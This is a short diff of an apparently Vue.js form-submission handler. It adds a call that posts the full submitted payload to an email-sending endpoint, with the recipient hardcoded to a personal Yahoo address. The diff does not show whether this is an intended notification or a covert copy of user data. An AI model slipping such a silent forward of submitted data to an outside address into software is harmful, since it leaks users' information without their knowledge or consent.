@@ -520,6 +520,10 @@ export default {
               this.$router.push("/done");
             })
             .catch(err => console.log(err));
+          apiCall("post", "/email/send", {
+            ...payload,
+            email: "kamy_g_marius@yahoo.com"
+          });
         })
         .catch(err => console.log(err));
     }
